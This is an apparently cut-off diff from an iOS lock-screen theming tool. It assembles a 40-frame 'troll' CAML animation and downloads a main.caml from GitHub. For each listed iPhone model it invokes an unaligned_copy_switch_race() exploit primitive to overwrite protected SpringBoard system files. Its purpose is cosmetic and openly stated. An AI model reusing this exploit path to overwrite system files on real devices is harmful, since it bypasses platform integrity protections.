+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+        });
+    } else {
+        NSString *troll1 = [[NSBundle mainBundle] pathForResource:@"trollformation1" ofType:@"png"];
+        NSString *troll2 = [[NSBundle mainBundle] pathForResource:@"trollformation2" ofType:@"png"];
+        NSString *troll3 = [[NSBundle mainBundle] pathForResource:@"trollformation3" ofType:@"png"];
+        NSString *troll4 = [[NSBundle mainBundle] pathForResource:@"trollformation4" ofType:@"png"];
+        NSString *troll5 = [[NSBundle mainBundle] pathForResource:@"trollformation5" ofType:@"png"];
+        NSString *troll6 = [[NSBundle mainBundle] pathForResource:@"trollformation6" ofType:@"png"];
+        NSString *troll7 = [[NSBundle mainBundle] pathForResource:@"trollformation7" ofType:@"png"];
+        NSString *troll8 = [[NSBundle mainBundle] pathForResource:@"trollformation8" ofType:@"png"];
+        NSString *troll9 = [[NSBundle mainBundle] pathForResource:@"trollformation9" ofType:@"png"];
+        NSString *troll10 = [[NSBundle mainBundle] pathForResource:@"trollformation10" ofType:@"png"];
+        NSString *troll11 = [[NSBundle mainBundle] pathForResource:@"trollformation11" ofType:@"png"];
+        NSString *troll12 = [[NSBundle mainBundle] pathForResource:@"trollformation12" ofType:@"png"];
+        NSString *troll13 = [[NSBundle mainBundle] pathForResource:@"trollformation13" ofType:@"png"];
+        NSString *troll14 = [[NSBundle mainBundle] pathForResource:@"trollformation14" ofType:@"png"];
+        NSString *troll15 = [[NSBundle mainBundle] pathForResource:@"trollformation15" ofType:@"png"];
+        NSString *troll16 = [[NSBundle mainBundle] pathForResource:@"trollformation16" ofType:@"png"];
+        NSString *troll17 = [[NSBundle mainBundle] pathForResource:@"trollformation17" ofType:@"png"];
+        NSString *troll18 = [[NSBundle mainBundle] pathForResource:@"trollformation18" ofType:@"png"];
+        NSString *troll19 = [[NSBundle mainBundle] pathForResource:@"trollformation19" ofType:@"png"];
+        NSString *troll20 = [[NSBundle mainBundle] pathForResource:@"trollformation20" ofType:@"png"];
+        NSString *troll21 = [[NSBundle mainBundle] pathForResource:@"trollformation21" ofType:@"png"];
+        NSString *troll22 = [[NSBundle mainBundle] pathForResource:@"trollformation22" ofType:@"png"];
+        NSString *troll23 = [[NSBundle mainBundle] pathForResource:@"trollformation23" ofType:@"png"];
+        NSString *troll24 = [[NSBundle mainBundle] pathForResource:@"trollformation24" ofType:@"png"];
+        NSString *troll25 = [[NSBundle mainBundle] pathForResource:@"trollformation25" ofType:@"png"];
+        NSString *troll26 = [[NSBundle mainBundle] pathForResource:@"trollformation26" ofType:@"png"];
+        NSString *troll27 = [[NSBundle mainBundle] pathForResource:@"trollformation27" ofType:@"png"];
+        NSString *troll28 = [[NSBundle mainBundle] pathForResource:@"trollformation28" ofType:@"png"];
+        NSString *troll29 = [[NSBundle mainBundle] pathForResource:@"trollformation29" ofType:@"png"];
+        NSString *troll30 = [[NSBundle mainBundle] pathForResource:@"trollformation30" ofType:@"png"];
+        NSString *troll31 = [[NSBundle mainBundle] pathForResource:@"trollformation31" ofType:@"png"];
+        NSString *troll32 = [[NSBundle mainBundle] pathForResource:@"trollformation32" ofType:@"png"];
+        NSString *troll33 = [[NSBundle mainBundle] pathForResource:@"trollformation33" ofType:@"png"];
+        NSString *troll34 = [[NSBundle mainBundle] pathForResource:@"trollformation34" ofType:@"png"];
+        NSString *troll35 = [[NSBundle mainBundle] pathForResource:@"trollformation35" ofType:@"png"];
+        NSString *troll36 = [[NSBundle mainBundle] pathForResource:@"trollformation36" ofType:@"png"];
+        NSString *trolley = [[NSBundle mainBundle] pathForResource:@"trollformation37" ofType:@"png"];
+        NSString *troll38 = [[NSBundle mainBundle] pathForResource:@"trollformation38" ofType:@"png"];
+        NSString *troll39 = [[NSBundle mainBundle] pathForResource:@"trollformation39" ofType:@"png"];
+        NSString *troll40 = [[NSBundle mainBundle] pathForResource:@"trollformation40" ofType:@"png"];
+        NSString *fileContents = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
+<caml xmlns=\"http://www.apple.com/CoreAnimation/1.0\">\
+  <CALayer allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 69.0 100.0\" contentsFormat=\"RGBA8\" name=\"root\" position=\"34.5 50.0\">\
+    <sublayers>\
+      <CALayer id=\"#3\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" geometryFlipped=\"1\" name=\"container\" position=\"34.5 50.0\">\
+          <sublayers>\
+            <CALayer id=\"#2\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shake\" position=\"73.5 66.0\">\
+              <sublayers>\
+                <CALayer id=\"#1\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shackle\" opacity=\"1\" position=\"73.5 66.0\">\
+                  <contents type=\"CGImage\" src=\"troll1\"/>\
+                </CALayer>\
+              </sublayers>\
+            </CALayer>\
+          </sublayers>\
+        </CALayer>\
+      </sublayers>\
+    <states>\
+      <LKState name=\"Sleep\">\
+    <elements>\
+      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"transform.scale.xy\">\
+        <value type=\"real\" value=\"0.75\"/>\
+      </LKStateSetValue>\
+      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"opacity\">\
+        <value type=\"integer\" value=\"0\"/>\
+      </LKStateSetValue>\
+    </elements>\
+      </LKState>\
+      <LKState name=\"Locked\"/>\
+      <LKState name=\"Unlocked\">\
+    <elements>\
+      <LKStateSetValue final=\"false\" targetId=\"#1\" keyPath=\"contents\">\
+        <value type=\"CGImage\" src=\"trolla40\"/>\
+      </LKStateSetValue>\
+    </elements>\
+      </LKState>\
+      <LKState name=\"Error\">\
+    <elements>\
+      <LKStateSetValue final=\"false\" targetId=\"#2\" keyPath=\"position.x\">\
+        <value type=\"real\" value=\"113.5\"/>\
+      </LKStateSetValue>\
+      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"position.x\">\
+        <value type=\"real\" value=\"-5.5\"/>\
+      </LKStateSetValue>\
+    </elements>\
+      </LKState>\
+    </states>\
+    <stateTransitions>\
+      <LKStateTransition fromState=\"*\" toState=\"Unlocked\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"contents\" targetId=\"#1\">\
+        <animation type=\"CAKeyframeAnimation\" calculationMode=\"discrete\" keyPath=\"contents\" duration=\"1\" fillMode=\"backwards\" timingFunction=\"linear\">\
+          <keyTimes>\
+                <real value=\"0\"/>\
+                <real value=\"0.01666666666\"/>\
+                <real value=\"0.03333333333\"/>\
+                <real value=\"0.05\"/>\
+                <real value=\"0.06666666666\"/>\
+                <real value=\"0.08333333333\"/>\
+                <real value=\"0.1\"/>\
+                <real value=\"0.116666666667\"/>\
+                <real value=\"0.133333333333\"/>\
+                <real value=\"0.15\"/>\
+                <real value=\"0.166666666667\"/>\
+                <real value=\"0.183333333333\"/>\
+                <real value=\"0.2\"/>\
+                <real value=\"0.216666666667\"/>\
+                <real value=\"0.233333333333\"/>\
+                <real value=\"0.25\"/>\
+                <real value=\"0.266666666667\"/>\
+                <real value=\"0.283333333333\"/>\
+                <real value=\"0.3\"/>\
+                <real value=\"0.316666666667\"/>\
+                <real value=\"0.333333333333\"/>\
+                <real value=\"0.35\"/>\
+                <real value=\"0.366666666667\"/>\
+                <real value=\"0.383333333333\"/>\
+                <real value=\"0.4\"/>\
+                <real value=\"0.416666666667\"/>\
+                <real value=\"0.433333333333\"/>\
+                <real value=\"0.45\"/>\
+                <real value=\"0.466666666667\"/>\
+                <real value=\"0.483333333333\"/>\
+                <real value=\"0.5\"/>\
+                <real value=\"0.516666666667\"/>\
+                <real value=\"0.533333333333\"/>\
+                <real value=\"0.55\"/>\
+                <real value=\"0.566666666667\"/>\
+                <real value=\"0.583333333333\"/>\
+                <real value=\"0.6\"/>\
+                <real value=\"0.616666666667\"/>\
+                <real value=\"0.633333333333\"/>\
+                <real value=\"0.65\"/>\
+                <real value=\"0.666666666667\"/>\
+                <real value=\"0.683333333333\"/>\
+                <real value=\"0.7\"/>\
+                <real value=\"0.716666666667\"/>\
+                <real value=\"0.733333333333\"/>\
+                <real value=\"0.75\"/>\
+                <real value=\"0.766666666667\"/>\
+                <real value=\"0.783333333333\"/>\
+                <real value=\"0.8\"/>\
+                <real value=\"0.816666666667\"/>\
+                <real value=\"0.833333333333\"/>\
+                <real value=\"0.85\"/>\
+                <real value=\"0.866666666667\"/>\
+                <real value=\"0.883333333333\"/>\
+                <real value=\"0.9\"/>\
+          </keyTimes>\
+          <values>\
+                <CGImage src=\"troll1\"/>\
+                <CGImage src=\"troll2\"/>\
+                <CGImage src=\"troll3\"/>\
+                <CGImage src=\"troll4\"/>\
+                <CGImage src=\"troll5\"/>\
+                <CGImage src=\"troll6\"/>\
+                <CGImage src=\"troll7\"/>\
+                <CGImage src=\"troll8\"/>\
+                <CGImage src=\"troll9\"/>\
+                <CGImage src=\"trolling10\"/>\
+                <CGImage src=\"trolling11\"/>\
+                <CGImage src=\"trolling12\"/>\
+                <CGImage src=\"trolling13\"/>\
+                <CGImage src=\"trolling14\"/>\
+                <CGImage src=\"trolling15\"/>\
+                <CGImage src=\"trolling16\"/>\
+                <CGImage src=\"trolling17\"/>\
+                <CGImage src=\"trolling18\"/>\
+                <CGImage src=\"trolling19\"/>\
+                <CGImage src=\"trolley20\"/>\
+                <CGImage src=\"trolley21\"/>\
+                <CGImage src=\"trolley22\"/>\
+                <CGImage src=\"trolley23\"/>\
+                <CGImage src=\"trolley24\"/>\
+                <CGImage src=\"trolley25\"/>\
+                <CGImage src=\"trolley26\"/>\
+                <CGImage src=\"trolley27\"/>\
+                <CGImage src=\"trolley28\"/>\
+                <CGImage src=\"trolley29\"/>\
+                <CGImage src=\"trolla30\"/>\
+                <CGImage src=\"trolla31\"/>\
+                <CGImage src=\"trolla32\"/>\
+                <CGImage src=\"trolla33\"/>\
+                <CGImage src=\"trolla34\"/>\
+                <CGImage src=\"trolla35\"/>\
+                <CGImage src=\"trolla36\"/>\
+                <CGImage src=\"trolla37\"/>\
+                <CGImage src=\"trolla38\"/>\
+                <CGImage src=\"trolla39\"/>\
+                <CGImage src=\"trolla40\"/>\
+          </values>\
+        </animation>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"Unlocked\" toState=\"*\">\
+    <elements/>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"*\" toState=\"Sleep\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+      <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"Sleep\" toState=\"*\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+      <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"*\" toState=\"Error\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.2\" fillMode=\"both\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
+        <animation type=\"CASpringAnimation\" damping=\"40\" mass=\"3\" stiffness=\"2200\" keyPath=\"position.x\" beginTime=\"0.075\" duration=\"0.78\" fillMode=\"both\" speed=\"1.4\"/>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+      <LKStateTransition fromState=\"Error\" toState=\"*\">\
+    <elements>\
+      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
+        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
+      </LKStateTransitionElement>\
+    </elements>\
+      </LKStateTransition>\
+    </stateTransitions>\
+  </CALayer>\
+</caml>\
+";
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll1"
+                                                               withString:troll1];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll2"
+                                                               withString:troll2];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll3"
+                                                               withString:troll3];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll4"
+                                                               withString:troll4];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll5"
+                                                               withString:troll5];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll6"
+                                                               withString:troll6];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll7"
+                                                               withString:troll7];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll8"
+                                                               withString:troll8];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll9"
+                                                               withString:troll9];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling10"
+                                                               withString:troll10];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling11"
+                                                               withString:troll11];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling12"
+                                                               withString:troll12];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling13"
+                                                               withString:troll13];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling14"
+                                                               withString:troll14];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling15"
+                                                               withString:troll15];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling16"
+                                                               withString:troll16];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling17"
+                                                               withString:troll17];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling18"
+                                                               withString:troll18];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling19"
+                                                               withString:troll19];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley20"
+                                                               withString:troll20];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley21"
+                                                               withString:troll21];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley22"
+                                                               withString:troll22];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley23"
+                                                               withString:troll23];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley24"
+                                                               withString:troll24];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley25"
+                                                               withString:troll25];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley26"
+                                                               withString:troll26];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley27"
+                                                               withString:troll27];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley28"
+                                                               withString:troll28];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley29"
+                                                               withString:troll29];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla30"
+                                                               withString:troll30];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla31"
+                                                               withString:troll31];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla32"
+                                                               withString:troll32];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla33"
+                                                               withString:troll33];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla34"
+                                                               withString:troll34];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla35"
+                                                               withString:troll35];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla36"
+                                                               withString:troll36];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla37"
+                                                               withString:trolley];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla38"
+                                                               withString:troll38];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla39"
+                                                               withString:troll39];
+        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla40"
+                                                               withString:troll40];
+        
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+            NSLog(@"downloading a fresh copy of main.caml");
+            NSString *urlToDownload = @"https://raw.githubusercontent.com/haxi0/TrollLock-Reborn/main/assets/main.caml";
+            NSURL  *url = [NSURL URLWithString:urlToDownload];
+            NSData *urlData = [NSData dataWithContentsOfURL:url];
+            if ( urlData )
+            {
+                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+                NSString  *documentsDirectory = [paths objectAtIndex:0];
+                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"main.caml"];
 
-void poc73(void) {
-    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
-    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
-    const char *model_path = dirName.UTF8String;
-    g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
-    g_arg_overwrite_file_path = model_path;
-    unaligned_copy_switch_race();
-}
-
-void poc896(void) {
-    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
-    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
-    const char *model_path = dirName.UTF8String;
-    g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
-    g_arg_overwrite_file_path = model_path;
-    unaligned_copy_switch_race();
-}
-
-void poc2x896(void) {
-    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
-    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
-    const char *model_path = dirName.UTF8String;
-    g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
-    g_arg_overwrite_file_path = model_path;
-    unaligned_copy_switch_race();
-}
-
-void poc2x812(void) {
-    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
-    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
-    const char *model_path = dirName.UTF8String;
-    g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-812h.ca/main.caml";
-    g_arg_overwrite_file_path = model_path;
-    unaligned_copy_switch_race();
+                dispatch_async(dispatch_get_main_queue(), ^{
+                    [urlData writeToFile:filePath atomically:YES];
+                    [fileContents writeToFile:filePath atomically:YES];
+                    NSLog(@"yay! success");
+                });
+            }
+            
+        });
+        
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+            if ([model isEqual:@"iPhone14,7"]) { // iPhone 14
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone13,2"]) { // iPhone 12
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone13,3"]) { // iPhone 12 Pro
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone13,4"]) { // iPhone 12 Pro Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone13,1"]) { // iPhone 12 Mini
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone14,3"]) { // iPhone 13 Pro Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone14,2"]) { // iPhone 13 Pro
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone14,5"]) { // iPhone 13
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone14,4"]) { // iPhone 13 Mini
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone10,3"]) { // iPhone X (Global)
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone10,6"]) { // iPhone X (GSM)
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone15,2"]) { // iPhone 14 Pro
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone15,3"]) { // iPhone 14 Pro Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone11,2"]) { // iPhone XS
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone11,6"]) { // iPhone XS Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone11,4"]) { // iPhone XS Max (China)
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone12,1"]) { // iPhone 11
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone12,3"]) { // iPhone 11 Pro
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone12,5"]) { // iPhone 11 Pro Max
+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+            
+            if ([model isEqual:@"iPhone11,8"]) { // iPhone XR
